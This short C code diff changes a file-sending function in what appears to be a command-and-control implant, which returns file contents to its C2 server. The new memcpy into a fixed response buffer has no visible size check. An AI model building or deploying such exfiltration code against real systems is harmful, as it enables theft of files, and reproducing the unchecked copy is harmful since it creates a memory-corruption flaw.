@@ -55,7 +55,9 @@ int sendFileContents(int* client_fd, uint64_t file_size, char* file_bytes)
         goto cleanup;
     }
 
-    bytes_sent = send(*client_fd, (void*)file_bytes, file_size, 0);
+    memcpy(response.getfileresponse.filebytes, file_bytes, file_size);
+
+    bytes_sent = send(*client_fd, (void*)&response, sizeof(response), 0);
     if (bytes_sent == 0)
     {
         printf("Failed to send file bytes back to C2!\n");
